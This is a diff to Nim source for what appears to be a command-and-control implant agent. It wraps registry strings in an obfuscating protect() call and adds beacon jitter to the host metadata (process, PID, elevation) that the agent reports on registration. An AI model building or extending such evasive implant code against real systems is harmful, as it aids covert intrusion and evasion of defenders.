@@ -164,11 +164,11 @@ proc getProductType(): ProductType =
 
     # Using the 'registry' module, we can get the exact registry value
     case getUnicodeValue(protect("""SYSTEM\CurrentControlSet\Control\ProductOptions"""), protect("ProductType"), HKEY_LOCAL_MACHINE)
-    of "WinNT":
+    of protect("WinNT"):
         return WORKSTATION
-    of "ServerNT":
+    of protect("ServerNT"):
         return SERVER
-    of "LanmanNT": 
+    of protect("LanmanNT"): 
         return DC
 
 proc getOSVersion(): string = 
@@ -218,7 +218,8 @@ proc collectAgentMetadata*(ctx: AgentCtx): AgentRegistrationData =
             process: string.toBytes(getProcessExe()),
             pid: cast[uint32](getProcessId()),
             isElevated: cast[uint8](isElevated()),
-            sleep: cast[uint32](ctx.sleep),
+            sleep: cast[uint32](ctx.sleepSettings.sleepDelay),
+            jitter: cast[uint32](ctx.sleepSettings.jitter),
             modules: cast[uint32](MODULES)
         )
     )
@@ -239,6 +240,7 @@ proc serializeRegistrationData*(ctx: AgentCtx, data: var AgentRegistrationData):
         .add(data.metadata.pid)
         .add(data.metadata.isElevated)
         .add(data.metadata.sleep)
+        .add(data.metadata.jitter)
         .add(data.metadata.modules)
 
     let metadata = packer.pack()
